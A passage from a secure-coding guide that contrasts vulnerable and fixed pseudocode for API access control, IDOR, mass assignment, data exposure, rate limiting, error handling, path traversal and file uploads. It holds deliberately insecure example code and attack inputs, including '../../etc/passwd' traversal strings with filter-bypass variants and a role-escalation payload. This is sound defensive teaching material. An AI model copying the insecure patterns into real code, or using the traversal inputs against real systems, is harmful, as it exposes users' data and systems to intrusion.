                {algorithm: "SHA-256", content: dep.sha256}
            ],
            licenses: dep.licenses,
            supplier: dep.publisher
        })
    END FOR

    // Export for vulnerability tracking
    write_file("sbom.json", json.encode(sbom))

    // Submit to vulnerability database for ongoing monitoring
    vuln_service.monitor_sbom(sbom)
END FUNCTION
```

---

## 9. API Security

**CWE References:** CWE-284 (Improper Access Control), CWE-639 (IDOR), CWE-915 (Mass Assignment), CWE-200 (Exposure of Sensitive Information), CWE-770 (Resource Allocation Without Limits), CWE-209 (Error Message Information Exposure)
**Severity:** Critical to High | **Related:** [[API-Security]]

> **Risk:** APIs are the primary attack surface for modern applications. Missing authentication, broken authorization (IDOR), and mass assignment vulnerabilities allow attackers to access or modify data belonging to other users, escalate privileges, and exfiltrate sensitive information. AI frequently generates API endpoints without proper security controls.

### 9.1 Missing Authentication on Endpoints

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Unprotected API endpoints
// ========================================

// No authentication - anyone can access
@route("/api/users")
FUNCTION get_all_users():
    RETURN database.query("SELECT * FROM users")
END FUNCTION

// Admin functionality without auth check
@route("/api/admin/delete-user/{id}")
FUNCTION admin_delete_user(id):
    database.execute("DELETE FROM users WHERE id = ?", [id])
    RETURN {status: "deleted"}
END FUNCTION

// Sensitive data exposed without auth
@route("/api/orders/{order_id}")
FUNCTION get_order(order_id):
    RETURN database.get_order(order_id)
END FUNCTION

// "Security through obscurity" - hidden endpoint still accessible
@route("/api/internal/debug-info")
FUNCTION get_debug_info():
    RETURN {
        database_connection: DB_STRING,
        api_keys: LOADED_KEYS,
        server_config: CONFIG
    }
END FUNCTION

// ========================================
// GOOD: Authentication on all protected endpoints
// ========================================

// Middleware to enforce authentication
FUNCTION require_auth(handler):
    RETURN FUNCTION wrapped(request):
        token = request.headers.get("Authorization")

        IF token IS NULL:
            RETURN response(401, {error: "Authentication required"})
        END IF

        user = verify_token(token)
        IF user IS NULL:
            RETURN response(401, {error: "Invalid or expired token"})
        END IF

        request.user = user
        RETURN handler(request)
    END FUNCTION
END FUNCTION

// Middleware for admin-only routes
FUNCTION require_admin(handler):
    RETURN require_auth(FUNCTION wrapped(request):
        IF request.user.role != "admin":
            log.security("Unauthorized admin access attempt", {
                user_id: request.user.id,
                endpoint: request.path
            })
            RETURN response(403, {error: "Admin access required"})
        END IF

        RETURN handler(request)
    END FUNCTION)
END FUNCTION

// Protected endpoints with proper auth
@route("/api/users")
@require_admin  // Only admins can list all users
FUNCTION get_all_users(request):
    // Return only non-sensitive fields
    users = database.query("SELECT id, name, email, created_at FROM users")
    RETURN response(200, {users: users})
END FUNCTION

// Admin endpoint with proper protection
@route("/api/admin/delete-user/{id}")
@require_admin
FUNCTION admin_delete_user(request, id):
    // Audit log before action
    log.audit("User deletion", {
        admin_id: request.user.id,
        target_user_id: id
    })

    database.soft_delete("users", id)  // Soft delete for audit trail
    RETURN response(200, {status: "deleted"})
END FUNCTION

// Never expose internal/debug endpoints in production
IF environment != "production":
    @route("/api/internal/debug-info")
    @require_admin
    FUNCTION get_debug_info(request):
        RETURN {config: get_safe_config()}  // Sanitized config only
    END FUNCTION
END IF

// Default deny - explicitly define allowed public endpoints
PUBLIC_ENDPOINTS = [
    "/api/auth/login",
    "/api/auth/register",
    "/api/public/status",
    "/api/public/docs"
]

FUNCTION global_auth_middleware(request):
    IF request.path IN PUBLIC_ENDPOINTS:
        RETURN next(request)
    END IF

    // All other routes require authentication by default
    RETURN require_auth(next)(request)
END FUNCTION
```

### 9.2 Broken Object-Level Authorization (IDOR)

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: IDOR vulnerabilities - no ownership check
// ========================================

// Attacker changes user_id in URL to access others' data
@route("/api/users/{user_id}/profile")
@require_auth
FUNCTION get_user_profile(request, user_id):
    // VULNERABLE: No check that user_id belongs to authenticated user
    profile = database.get_profile(user_id)
    RETURN response(200, profile)
END FUNCTION

// Attacker can delete any order by changing order_id
@route("/api/orders/{order_id}")
@require_auth
FUNCTION delete_order(request, order_id):
    // VULNERABLE: Deletes any order regardless of owner
    database.delete("orders", order_id)
    RETURN response(200, {status: "deleted"})
END FUNCTION

// Attacker accesses any document by guessing/incrementing ID
@route("/api/documents/{doc_id}")
@require_auth
FUNCTION get_document(request, doc_id):
    // VULNERABLE: Sequential IDs make enumeration easy
    doc = database.get_document(doc_id)
    RETURN response(200, doc)
END FUNCTION

// Horizontal privilege escalation via parameter tampering
@route("/api/transfer")
@require_auth
FUNCTION transfer_funds(request):
    // VULNERABLE: from_account comes from user input
    from_account = request.body.from_account
    to_account = request.body.to_account
    amount = request.body.amount

    execute_transfer(from_account, to_account, amount)
    RETURN response(200, {status: "transferred"})
END FUNCTION

// ========================================
// GOOD: Proper object-level authorization
// ========================================

// Always verify ownership before access
@route("/api/users/{user_id}/profile")
@require_auth
FUNCTION get_user_profile(request, user_id):
    // SECURE: Verify user can only access their own profile
    IF user_id != request.user.id AND request.user.role != "admin":
        log.security("IDOR attempt blocked", {
            authenticated_user: request.user.id,
            attempted_access: user_id
        })
        RETURN response(403, {error: "Access denied"})
    END IF

    profile = database.get_profile(user_id)
    IF profile IS NULL:
        RETURN response(404, {error: "Profile not found"})
    END IF

    RETURN response(200, profile)
END FUNCTION

// Resource ownership verification
@route("/api/orders/{order_id}")
@require_auth
FUNCTION delete_order(request, order_id):
    order = database.get_order(order_id)

    IF order IS NULL:
        RETURN response(404, {error: "Order not found"})
    END IF

    // SECURE: Verify ownership before action
    IF order.user_id != request.user.id:
        log.security("Unauthorized order deletion attempt", {
            user_id: request.user.id,
            order_id: order_id,
            owner_id: order.user_id
        })
        RETURN response(403, {error: "Access denied"})
    END IF

    // Additional business logic check
    IF order.status == "shipped":
        RETURN response(400, {error: "Cannot delete shipped orders"})
    END IF

    database.delete("orders", order_id)
    RETURN response(200, {status: "deleted"})
END FUNCTION

// Use UUIDs instead of sequential IDs to prevent enumeration
FUNCTION create_document(request):
    doc_id = generate_uuid()  // Not sequential, not guessable

    database.insert("documents", {
        id: doc_id,
        owner_id: request.user.id,
        content: request.body.content
    })

    RETURN response(201, {id: doc_id})
END FUNCTION

// Implicit ownership from authenticated user
@route("/api/transfer")
@require_auth
FUNCTION transfer_funds(request):
    // SECURE: from_account MUST belong to authenticated user
    from_account = database.get_account(request.body.from_account)

    IF from_account IS NULL OR from_account.owner_id != request.user.id:
        RETURN response(403, {error: "Invalid source account"})
    END IF

    to_account = database.get_account(request.body.to_account)
    IF to_account IS NULL:
        RETURN response(404, {error: "Destination account not found"})
    END IF

    amount = request.body.amount
    IF amount <= 0 OR amount > from_account.balance:
        RETURN response(400, {error: "Invalid amount"})
    END IF

    execute_transfer(from_account.id, to_account.id, amount)

    log.audit("Funds transfer", {
        user_id: request.user.id,
        from: from_account.id,
        to: to_account.id,
        amount: amount
    })

    RETURN response(200, {status: "transferred"})
END FUNCTION

// Reusable authorization decorator
FUNCTION authorize_resource(resource_type, id_param):
    RETURN FUNCTION decorator(handler):
        RETURN FUNCTION wrapped(request):
            resource_id = request.params[id_param]
            resource = database.get(resource_type, resource_id)

            IF resource IS NULL:
                RETURN response(404, {error: resource_type + " not found"})
            END IF

            IF NOT can_access(request.user, resource):
                log.security("Authorization failed", {
                    user_id: request.user.id,
                    resource_type: resource_type,
                    resource_id: resource_id
                })
                RETURN response(403, {error: "Access denied"})
            END IF

            request.resource = resource
            RETURN handler(request)
        END FUNCTION
    END FUNCTION
END FUNCTION

// Usage
@route("/api/documents/{doc_id}")
@require_auth
@authorize_resource("documents", "doc_id")
FUNCTION get_document(request, doc_id):
    RETURN response(200, request.resource)  // Already verified
END FUNCTION
```

### 9.3 Mass Assignment Vulnerabilities

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Mass assignment - accepting all user input
// ========================================

// Attacker sends: {"name": "John", "role": "admin", "balance": 999999}
@route("/api/users/update")
@require_auth
FUNCTION update_user(request):
    // VULNERABLE: Directly assigns all request body fields
    user = database.get_user(request.user.id)

    FOR field, value IN request.body:
        user[field] = value  // Attacker can set ANY field!
    END FOR

    database.save(user)
    RETURN response(200, user)
END FUNCTION

// ORM auto-mapping vulnerability
@route("/api/users")
@require_auth
FUNCTION create_user(request):
    // VULNERABLE: ORM creates user from all request fields
    user = User.create(request.body)  // Includes role, isAdmin, etc.!
    RETURN response(201, user)
END FUNCTION

// Nested object mass assignment
@route("/api/orders")
@require_auth
FUNCTION create_order(request):
    // VULNERABLE: Nested payment object can set price
    order = Order.create({
        user_id: request.user.id,
        items: request.body.items,
        payment: request.body.payment  // Attacker sets payment.amount = 0
    })
    RETURN response(201, order)
END FUNCTION

// ========================================
// GOOD: Explicit field allowlisting
// ========================================

// Define what fields can be updated
CONSTANT USER_UPDATABLE_FIELDS = ["name", "email", "phone", "address"]
CONSTANT USER_ADMIN_FIELDS = ["role", "status", "verified"]

@route("/api/users/update")
@require_auth
FUNCTION update_user_secure(request):
    user = database.get_user(request.user.id)

    // SECURE: Only update explicitly allowed fields
    FOR field IN USER_UPDATABLE_FIELDS:
        IF field IN request.body:
            user[field] = sanitize(request.body[field])
        END IF
    END FOR

    database.save(user)

    // Return only safe fields
    RETURN response(200, user.to_public_dict())
END FUNCTION

// Admin with different field permissions
@route("/api/admin/users/{user_id}")
@require_admin
FUNCTION admin_update_user(request, user_id):
    user = database.get_user(user_id)

    // Admins can update more fields, but still allowlisted
    allowed_fields = USER_UPDATABLE_FIELDS + USER_ADMIN_FIELDS

    FOR field IN allowed_fields:
        IF field IN request.body:
            user[field] = request.body[field]
        END IF
    END FOR

    log.audit("Admin user update", {
        admin_id: request.user.id,
        user_id: user_id,
        fields_changed: request.body.keys()
    })

    database.save(user)
    RETURN response(200, user)
END FUNCTION

// Use DTOs (Data Transfer Objects) for input
CLASS UserUpdateDTO:
    name: String (max_length=100)
    email: String (email_format, max_length=255)
    phone: String (phone_format, optional)
    address: String (max_length=500, optional)

    FUNCTION from_request(body):
        dto = UserUpdateDTO()
        dto.name = validate_string(body.name, max_length=100)
        dto.email = validate_email(body.email)
        dto.phone = validate_phone(body.phone) IF body.phone ELSE NULL
        dto.address = validate_string(body.address, max_length=500) IF body.address ELSE NULL
        RETURN dto
    END FUNCTION
END CLASS

@route("/api/users/update")
@require_auth
FUNCTION update_user_dto(request):
    TRY:
        dto = UserUpdateDTO.from_request(request.body)
    CATCH ValidationError as e:
        RETURN response(400, {error: e.message})
    END TRY

    user = database.get_user(request.user.id)
    user.apply_dto(dto)  // Only applies DTO fields
    database.save(user)

    RETURN response(200, user.to_public_dict())
END FUNCTION

// Nested objects with strict validation
CLASS OrderCreateDTO:
    items: Array of OrderItemDTO
    shipping_address_id: UUID
    // payment calculated server-side, NOT from request

    FUNCTION from_request(body, user):
        dto = OrderCreateDTO()
        dto.items = [OrderItemDTO.from_request(item) FOR item IN body.items]

        // Verify address belongs to user
        address = database.get_address(body.shipping_address_id)
        IF address IS NULL OR address.user_id != user.id:
            THROW ValidationError("Invalid shipping address")
        END IF
        dto.shipping_address_id = address.id

        RETURN dto
    END FUNCTION
END CLASS

@route("/api/orders")
@require_auth
FUNCTION create_order_secure(request):
    dto = OrderCreateDTO.from_request(request.body, request.user)

    // Calculate payment server-side from validated items
    total = 0
    FOR item IN dto.items:
        product = database.get_product(item.product_id)
        total += product.price * item.quantity  // Price from DB, not request!
    END FOR

    order = Order.create({
        user_id: request.user.id,
        items: dto.items,
        shipping_address_id: dto.shipping_address_id,
        total: total  // Server-calculated
    })

    RETURN response(201, order.to_dict())
END FUNCTION
```

### 9.4 Excessive Data Exposure

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Exposing too much data in API responses
// ========================================

// Returns entire user object including sensitive fields
@route("/api/users/{user_id}")
@require_auth
FUNCTION get_user(request, user_id):
    user = database.get_user(user_id)
    RETURN response(200, user)  // Includes password_hash, SSN, internal_notes!
END FUNCTION

// Returns all columns from database
@route("/api/orders")
@require_auth
FUNCTION get_orders(request):
    orders = database.query("SELECT * FROM orders WHERE user_id = ?",
                           [request.user.id])
    RETURN response(200, orders)  // Includes internal pricing, profit margins
END FUNCTION

// Exposes related entities without filtering
@route("/api/products/{id}")
FUNCTION get_product(request, id):
    product = database.get_product_with_relations(id)
    RETURN response(200, product)  // Includes supplier.contact, supplier.cost
END FUNCTION

// Debug info in production responses
@route("/api/search")
FUNCTION search(request):
    results = database.search(request.query.q)
    RETURN response(200, {
        results: results,
        query_time_ms: results.execution_time,
        sql_query: results.raw_query,  // Exposes DB schema!
        server_id: SERVER_ID
    })
END FUNCTION

// ========================================
// GOOD: Response filtering and DTOs
// ========================================

// Define response schemas
CLASS UserPublicResponse:
    id: UUID
    name: String
    avatar_url: String
    created_at: DateTime

    FUNCTION from_user(user):
        RETURN {
            id: user.id,
            name: user.name,
            avatar_url: user.avatar_url,
            created_at: user.created_at
        }
    END FUNCTION
END CLASS

CLASS UserPrivateResponse:  // For the user themselves
    id: UUID
    name: String
    email: String
    phone: String (masked)
    avatar_url: String
    created_at: DateTime
    preferences: Object

    FUNCTION from_user(user):
        RETURN {
            id: user.id,
            name: user.name,
            email: user.email,
            phone: mask_phone(user.phone),  // Show only last 4 digits
            avatar_url: user.avatar_url,
            created_at: user.created_at,
            preferences: user.preferences
        }
    END FUNCTION
END CLASS

@route("/api/users/{user_id}")
@require_auth
FUNCTION get_user_filtered(request, user_id):
    user = database.get_user(user_id)

    IF user IS NULL:
        RETURN response(404, {error: "User not found"})
    END IF

    // Different responses based on who's requesting
    IF user_id == request.user.id:
        RETURN response(200, UserPrivateResponse.from_user(user))
    ELSE:
        RETURN response(200, UserPublicResponse.from_user(user))
    END IF
END FUNCTION

// Explicit field selection in queries
@route("/api/orders")
@require_auth
FUNCTION get_orders_filtered(request):
    // Only select fields needed for the response
    orders = database.query(
        "SELECT id, status, total, created_at, shipping_address " +
        "FROM orders WHERE user_id = ?",
        [request.user.id]
    )

    RETURN response(200, {
        orders: orders.map(order => OrderResponse.from_order(order))
    })
END FUNCTION

// Filter nested relations
CLASS ProductResponse:
    id: UUID
    name: String
    description: String
    price: Decimal
    category: String
    images: Array
    average_rating: Float
    // Excludes: cost, supplier, profit_margin, internal_notes

    FUNCTION from_product(product):
        RETURN {
            id: product.id,
            name: product.name,
            description: product.description,
            price: product.price,
            category: product.category.name,  // Only category name
            images: product.images.map(i => i.url),  // Only URLs
            average_rating: product.average_rating
        }
    END FUNCTION
END CLASS

// GraphQL field filtering
FUNCTION resolve_user(parent, args, context):
    user = database.get_user(args.id)

    // Check each requested field
    allowed_fields = get_allowed_fields(context.user, user)

    result = {}
    FOR field IN context.requested_fields:
        IF field IN allowed_fields:
            result[field] = user[field]
        ELSE:
            result[field] = NULL  // Or omit entirely
        END IF
    END FOR

    RETURN result
END FUNCTION

// Never expose internal debugging info
@route("/api/search")
FUNCTION search_safe(request):
    results = database.search(request.query.q)

    RETURN response(200, {
        results: results.items.map(item => item.to_public_dict()),
        total: results.total_count,
        page: results.page
        // No query_time_ms, sql_query, or server_id
    })
END FUNCTION

// Pagination to prevent data dumping
@route("/api/users")
@require_admin
FUNCTION list_users(request):
    page = INT(request.query.page, default=1)
    per_page = MIN(INT(request.query.per_page, default=20), 100)  // Max 100

    users = database.paginate("users", page, per_page)

    RETURN response(200, {
        users: users.map(u => UserAdminResponse.from_user(u)),
        pagination: {
            page: page,
            per_page: per_page,
            total_pages: users.total_pages,
            total_count: users.total_count
        }
    })
END FUNCTION
```

### 9.5 Missing Rate Limiting

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: No rate limiting
// ========================================

// Login endpoint vulnerable to brute force
@route("/api/auth/login")
FUNCTION login(request):
    user = database.find_by_email(request.body.email)

    IF user IS NULL OR NOT verify_password(request.body.password, user.password_hash):
        RETURN response(401, {error: "Invalid credentials"})
    END IF

    RETURN response(200, {token: create_token(user)})
END FUNCTION

// Expensive operation with no limits
@route("/api/reports/generate")
@require_auth
FUNCTION generate_report(request):
    // CPU-intensive, no limits - easy DoS
    report = generate_complex_report(request.body.params)
    RETURN response(200, report)
END FUNCTION

// SMS/email sending without limits
@route("/api/auth/send-verification")
FUNCTION send_verification(request):
    // Attacker can spam any phone/email
    send_sms(request.body.phone, generate_code())
    RETURN response(200, {status: "sent"})
END FUNCTION

// ========================================
// GOOD: Comprehensive rate limiting
// ========================================

// Rate limiter configuration
rate_limits = {
    // Per IP limits
    "ip:global": {limit: 1000, window: "1 hour"},
    "ip:auth": {limit: 10, window: "15 minutes"},
    "ip:sensitive": {limit: 5, window: "1 minute"},

    // Per user limits
    "user:global": {limit: 5000, window: "1 hour"},
    "user:write": {limit: 100, window: "1 hour"},

    // Per resource limits
    "resource:reports": {limit: 10, window: "1 hour"}
}

FUNCTION rate_limit(key_type, key_suffix=""):
    RETURN FUNCTION decorator(handler):
        RETURN FUNCTION wrapped(request):
            config = rate_limits[key_type]

            // Build rate limit key
            IF key_type.starts_with("ip:"):
                key = key_type + ":" + request.client_ip + key_suffix
            ELSE IF key_type.starts_with("user:"):
                IF request.user IS NULL:
                    RETURN response(401, {error: "Authentication required"})
                END IF
                key = key_type + ":" + request.user.id + key_suffix
            ELSE:
                key = key_type + key_suffix
            END IF

            // Check rate limit
            current = redis.incr(key)
            IF current == 1:
                redis.expire(key, config.window)
            END IF

            IF current > config.limit:
                retry_after = redis.ttl(key)
                log.security("Rate limit exceeded", {
                    key: key,
                    ip: request.client_ip,
                    user_id: request.user.id IF request.user ELSE NULL
                })
                RETURN response(429, {
                    error: "Too many requests",
                    retry_after: retry_after
                }, headers={"Retry-After": retry_after})
            END IF

            // Add rate limit headers
            response = handler(request)
            response.headers["X-RateLimit-Limit"] = config.limit
            response.headers["X-RateLimit-Remaining"] = config.limit - current
            response.headers["X-RateLimit-Reset"] = redis.ttl(key)

            RETURN response
        END FUNCTION
    END FUNCTION
END FUNCTION

// Login with rate limiting
@route("/api/auth/login")
@rate_limit("ip:auth")
FUNCTION login_protected(request):
    email = request.body.email

    // Additional per-account rate limiting
    account_key = "auth:account:" + sha256(email)
    attempts = redis.incr(account_key)
    IF attempts == 1:
        redis.expire(account_key, 3600)  // 1 hour
    END IF

    IF attempts > 5:
        // Lock account temporarily
        log.security("Account locked due to failed attempts", {email: email})
        RETURN response(423, {
            error: "Account temporarily locked",
            retry_after: redis.ttl(account_key)
        })
    END IF

    user = database.find_by_email(email)

    IF user IS NULL OR NOT verify_password(request.body.password, user.password_hash):
        // Don't reset counter on failure
        RETURN response(401, {error: "Invalid credentials"})
    END IF

    // Reset counter on successful login
    redis.delete(account_key)

    RETURN response(200, {token: create_token(user)})
END FUNCTION

// Expensive operations with strict limits
@route("/api/reports/generate")
@require_auth
@rate_limit("user:write")
@rate_limit("resource:reports")
FUNCTION generate_report_limited(request):
    // Queue for async processing if over capacity
    active_reports = get_active_report_count(request.user.id)

    IF active_reports > 3:
        RETURN response(429, {error: "Too many reports in progress"})
    END IF

    job_id = queue_report_generation(request.user.id, request.body.params)

    RETURN response(202, {
        job_id: job_id,
        status: "queued",
        estimated_time: estimate_completion_time()
    })
END FUNCTION

// SMS/email with phone/email-specific limits
@route("/api/auth/send-verification")
@rate_limit("ip:sensitive")
FUNCTION send_verification_limited(request):
    phone = request.body.phone

    // Rate limit per phone number
    phone_key = "verify:phone:" + sha256(phone)
    count = redis.incr(phone_key)
    IF count == 1:
        redis.expire(phone_key, 3600)  // 1 hour
    END IF

    IF count > 3:
        RETURN response(429, {
            error: "Too many verification requests for this number"
        })
    END IF

    // Verify phone format before sending
    IF NOT is_valid_phone(phone):
        RETURN response(400, {error: "Invalid phone number"})
    END IF

    code = generate_secure_code()
    redis.setex("verify:code:" + sha256(phone), 600, code)  // 10 min expiry

    send_sms(phone, "Your code: " + code)

    RETURN response(200, {status: "sent"})
END FUNCTION

// Sliding window rate limiter for more precise control
FUNCTION sliding_window_limit(key, limit, window_seconds):
    now = current_timestamp()
    window_start = now - window_seconds

    // Remove old entries
    redis.zremrangebyscore(key, "-inf", window_start)

    // Count current window
    count = redis.zcard(key)

    IF count >= limit:
        RETURN FALSE
    END IF

    // Add current request
    redis.zadd(key, now, generate_uuid())
    redis.expire(key, window_seconds)

    RETURN TRUE
END FUNCTION
```

### 9.6 Improper Error Handling in APIs

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Error messages revealing internal details
// ========================================

// Exposes database structure
@route("/api/users/{id}")
FUNCTION get_user_bad_errors(request, id):
    TRY:
        user = database.get_user(id)
        RETURN response(200, user)
    CATCH DatabaseError as e:
        // VULNERABLE: Exposes table names, query structure
        RETURN response(500, {
            error: "Database error",
            query: "SELECT * FROM users WHERE id = " + id,
            message: e.message,  // "Column 'password_hash' cannot be null"
            stack_trace: e.stack_trace
        })
    END TRY
END FUNCTION

// Reveals filesystem paths
@route("/api/files/{file_id}")
FUNCTION get_file_bad(request, file_id):
    TRY:
        content = read_file("/var/app/uploads/" + file_id)
        RETURN response(200, content)
    CATCH FileNotFoundError as e:
        // VULNERABLE: Exposes server filesystem structure
        RETURN response(404, {
            error: "File not found: /var/app/uploads/" + file_id,
            available_files: list_directory("/var/app/uploads/")
        })
    END TRY
END FUNCTION

// Authentication timing oracle
@route("/api/auth/login")
FUNCTION login_timing_oracle(request):
    user = database.find_by_email(request.body.email)

    IF user IS NULL:
        // Returns immediately - attacker knows email doesn't exist
        RETURN response(401, {error: "User not found"})
    END IF

    IF NOT verify_password(request.body.password, user.password_hash):
        // Takes longer due to password verification
        RETURN response(401, {error: "Invalid password"})
    END IF

    RETURN response(200, {token: create_token(user)})
END FUNCTION

// Inconsistent error format breaks security tools
@route("/api/orders")
FUNCTION create_order_inconsistent(request):
    IF NOT valid_items(request.body.items):
        RETURN response(400, "Invalid items")  // String
    END IF

    IF NOT has_stock(request.body.items):
        RETURN response(400, {msg: "Out of stock"})  // Different key
    END IF

    IF payment_failed:
        RETURN {status: "error", reason: "Payment failed"}  // No status code
    END IF
END FUNCTION

// ========================================
// GOOD: Secure, consistent error handling
// ========================================

// Standardized error response class
CLASS APIError:
    status: Integer
    code: String  // Machine-readable error code
    message: String  // User-friendly message
    request_id: String  // For support/debugging

    FUNCTION to_response():
        RETURN response(this.status, {
            error: {
                code: this.code,
                message: this.message,
                request_id: this.request_id
            }
        })
    END FUNCTION
END CLASS

// Error codes mapping (documented in API docs)
ERROR_CODES = {
    "AUTH_REQUIRED": {status: 401, message: "Authentication required"},
    "AUTH_INVALID": {status: 401, message: "Invalid credentials"},
    "FORBIDDEN": {status: 403, message: "Access denied"},
    "NOT_FOUND": {status: 404, message: "Resource not found"},
    "VALIDATION_ERROR": {status: 400, message: "Invalid request data"},
    "RATE_LIMITED": {status: 429, message: "Too many requests"},
    "INTERNAL_ERROR": {status: 500, message: "An unexpected error occurred"}
}

// Global error handler
FUNCTION global_error_handler(error, request):
    request_id = generate_request_id()

    // Log full error details internally
    log.error("Request failed", {
        request_id: request_id,
        path: request.path,
        method: request.method,
        user_id: request.user.id IF request.user ELSE NULL,
        error_type: error.type,
        error_message: error.message,
        stack_trace: error.stack_trace,
        request_body: redact_sensitive(request.body)
    })

    // Return sanitized error to client
    IF error IS APIError:
        error.request_id = request_id
        RETURN error.to_response()
    ELSE IF error IS ValidationError:
        RETURN APIError(
            status=400,
            code="VALIDATION_ERROR",
            message=error.user_message,  // Safe message
            request_id=request_id
        ).to_response()
    ELSE:
        // Generic error - never expose internal details
        RETURN APIError(
            status=500,
            code="INTERNAL_ERROR",
            message="An unexpected error occurred. Reference: " + request_id,
            request_id=request_id
        ).to_response()
    END IF
END FUNCTION

// Secure authentication with constant-time comparison
@route("/api/auth/login")
FUNCTION login_secure_errors(request):
    email = request.body.email
    password = request.body.password

    user = database.find_by_email(email)

    // Always perform password check to prevent timing oracle
    IF user IS NOT NULL:
        password_valid = constant_time_compare(
            hash_password(password, user.salt),
            user.password_hash
        )
    ELSE:
        // Fake password check to maintain consistent timing
        constant_time_compare(
            hash_password(password, generate_fake_salt()),
            DUMMY_HASH
        )
        password_valid = FALSE
    END IF

    IF NOT password_valid:
        // Same error message whether user exists or not
        log.security("Failed login attempt", {
            email_hash: sha256(email),  // Don't log raw email
            ip: request.client_ip
        })
        RETURN APIError(
            status=401,
            code="AUTH_INVALID",
            message="Invalid email or password"
        ).to_response()
    END IF

    RETURN response(200, {token: create_token(user)})
END FUNCTION

// File operations without path disclosure
@route("/api/files/{file_id}")
FUNCTION get_file_secure(request, file_id):
    // Validate file_id format (UUID only)
    IF NOT is_valid_uuid(file_id):
        RETURN APIError(
            status=400,
            code="VALIDATION_ERROR",
            message="Invalid file ID format"
        ).to_response()
    END IF

    // Look up file in database (not filesystem path)
    file_record = database.get_file(file_id)

    IF file_record IS NULL:
        RETURN APIError(
            status=404,
            code="NOT_FOUND",
            message="File not found"
        ).to_response()
    END IF

    // Check ownership
    IF file_record.owner_id != request.user.id:
        // Same error as not found - don't reveal existence
        RETURN APIError(
            status=404,
            code="NOT_FOUND",
            message="File not found"
        ).to_response()
    END IF

    TRY:
        content = storage.read(file_record.storage_key)
        RETURN response(200, content, headers={
            "Content-Type": file_record.mime_type
        })
    CATCH StorageError as e:
        log.error("File read failed", {
            file_id: file_id,
            storage_key: file_record.storage_key,
            error: e.message
        })
        RETURN APIError(
            status=500,
            code="INTERNAL_ERROR",
            message="Unable to retrieve file"
        ).to_response()
    END TRY
END FUNCTION

// Validation errors without revealing schema
FUNCTION validate_request(schema, data):
    errors = []

    FOR field, rules IN schema:
        IF field NOT IN data AND rules.required:
            errors.append({
                field: field,
                message: "This field is required"
            })
        ELSE IF field IN data:
            value = data[field]

            // Type validation
            IF NOT check_type(value, rules.type):
                errors.append({
                    field: field,
                    message: "Invalid value"  // Don't say "expected integer"
                })
            // Length validation
            ELSE IF rules.max_length AND len(value) > rules.max_length:
                errors.append({
                    field: field,
                    message: "Value too long"
                })
            END IF
        END IF
    END FOR

    IF errors.length > 0:
        THROW ValidationError(errors)
    END IF
END FUNCTION
```

---

## 10. File Handling

**CWE References:** CWE-22 (Path Traversal), CWE-434 (Unrestricted Upload), CWE-377 (Insecure Temp File), CWE-59 (Symlink Following), CWE-732 (Incorrect Permission Assignment)
**Severity:** High to Critical | **Related:** [[File-Handling]]

> **Risk:** File handling vulnerabilities enable attackers to read/write arbitrary files, execute malicious uploads, or escalate privileges through symlink attacks. AI-generated code frequently uses unsafe path concatenation and skips file validation entirely.

### 10.1 Path Traversal Vulnerabilities

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Direct path concatenation allows traversal
// ========================================
FUNCTION download_file_vulnerable(user_requested_filename):
    // VULNERABLE: Attacker can request "../../etc/passwd"
    file_path = "/var/app/uploads/" + user_requested_filename

    content = read_file(file_path)
    RETURN content
END FUNCTION

@route("/api/files/download")
FUNCTION handle_download_bad(request):
    filename = request.query.filename
    // No validation - attacker controls path
    RETURN download_file_vulnerable(filename)
END FUNCTION

// Attack examples:
// ?filename=../../etc/passwd          -> reads /etc/passwd
// ?filename=....//....//etc/passwd    -> bypasses simple ../ filters
// ?filename=..%2F..%2Fetc/passwd      -> URL encoded traversal
// ?filename=/etc/passwd               -> absolute path injection

// ========================================
// GOOD: Secure path handling with validation
// ========================================
CONSTANT UPLOAD_DIR = "/var/app/uploads"

FUNCTION download_file_secure(user_requested_filename):
    // Step 1: Reject obviously malicious input
    IF user_requested_filename IS NULL OR user_requested_filename == "":
        THROW ValidationError("Filename required")
    END IF

    // Step 2: Get only the base filename, reject path components
    safe_filename = get_basename(user_requested_filename)

    // Step 3: Reject filenames that are empty after basename extraction
    IF safe_filename == "" OR safe_filename == "." OR safe_filename == "..":
        THROW ValidationError("Invalid filename")
    END IF

    // Step 4: Build the full path
    full_path = join_path(UPLOAD_DIR, safe_filename)

    // Step 5: Resolve to absolute path and verify it's within allowed directory
    resolved_path = resolve_absolute_path(full_path)

    IF NOT resolved_path.starts_with(UPLOAD_DIR + "/"):
        log.security("Path traversal attempt blocked", {
            requested: user_requested_filename,
            resolved: resolved_path
        })
        THROW SecurityError("Access denied")
    END IF

    // Step 6: Verify file exists and is a regular file (not directory/symlink)
    IF NOT file_exists(resolved_path) OR NOT is_regular_file(resolved_path):
        THROW NotFoundError("File not found")
    END IF

    RETURN read_file(resolved_path)
END FUNCTION

// Alternative: Use database lookups instead of filesystem paths
FUNCTION download_file_by_id(file_id):
    // Validate file_id format (UUID)
    IF NOT is_valid_uuid(file_id):
        THROW ValidationError("Invalid file ID")
    END IF

    // Look up file metadata in database
    file_record = database.query(
        "SELECT storage_path, original_name, owner_id FROM files WHERE id = ?",
        [file_id]
    )

    IF file_record IS NULL:
        THROW NotFoundError("File not found")
    END IF

    // Verify ownership
    IF file_record.owner_id != current_user.id:
        THROW ForbiddenError("Access denied")
    END IF

    // Storage path is server-controlled, not user input
    RETURN read_file(file_record.storage_path)
END FUNCTION

// Path validation helper
FUNCTION is_safe_path(base_dir, requested_path):
    // Resolve both paths to absolute canonical form
    base_resolved = resolve_canonical_path(base_dir)
    full_resolved = resolve_canonical_path(join_path(base_dir, requested_path))

    // Ensure resolved path is within base directory
    RETURN full_resolved.starts_with(base_resolved + PATH_SEPARATOR)
END FUNCTION
```

### 10.2 Unrestricted File Uploads

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: No validation on uploaded files
// ========================================
@route("/api/upload")
FUNCTION upload_file_vulnerable(request):
    uploaded_file = request.files.get("file")

    // VULNERABLE: Accepts any file type
    filename = uploaded_file.filename

    // VULNERABLE: Uses user-provided filename directly
    save_path = "/var/app/uploads/" + filename

    // VULNERABLE: No size limits
    uploaded_file.save(save_path)

    // VULNERABLE: May be served with executable MIME type
    RETURN {url: "/files/" + filename}
END FUNCTION

// Attack scenarios:
